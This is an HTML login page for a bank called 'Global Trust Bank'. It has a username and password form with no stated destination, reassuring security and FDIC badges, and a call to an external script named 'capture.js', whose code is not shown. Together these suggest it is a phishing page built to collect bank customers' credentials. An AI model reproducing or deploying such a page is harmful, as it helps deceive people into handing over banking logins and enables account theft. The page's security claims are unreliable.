<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login | Global Trust Bank</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap">
    <style>
        body { font-family: 'Roboto', sans-serif; background: #f5f7fa; margin: 0; padding: 40px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1); width: 100%; max-width: 420px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #0056a6; font-weight: 500; margin: 10px 0 5px; }
        .logo p { color: #666; font-size: 0.9em; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: none; border-color: #0056a6; }
        .btn { background: #0056a6; color: white; border: none; padding: 14px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: 500; cursor: pointer; }
        .btn:hover { background: #004080; }
        .footer { text-align: center; margin-top: 25px; color: #888; font-size: 0.85em; }
        .security-note { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; color: #28a745; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg width="60" height="60" viewBox="0 0 24 24" fill="#0056a6"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
            <h1>Global Trust Bank</h1>
            <p>Secure Online Banking</p>
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Online ID</label>
                <input type="text" id="username" name="username" placeholder="Enter your Online ID" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
            <div class="security-note">
                <svg width="16" height="16" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
                <span>Protected by Advanced Encryption</span>
            </div>
        </form>
        <div class="footer">
            <p>© 2023 Global Trust Bank. Member FDIC.</p>
            <p><a href="#" style="color: #0056a6;">Forgot Online ID or Password?</a></p>
        </div>
    </div>
    <script src="capture.js"></script>
</body>
</html>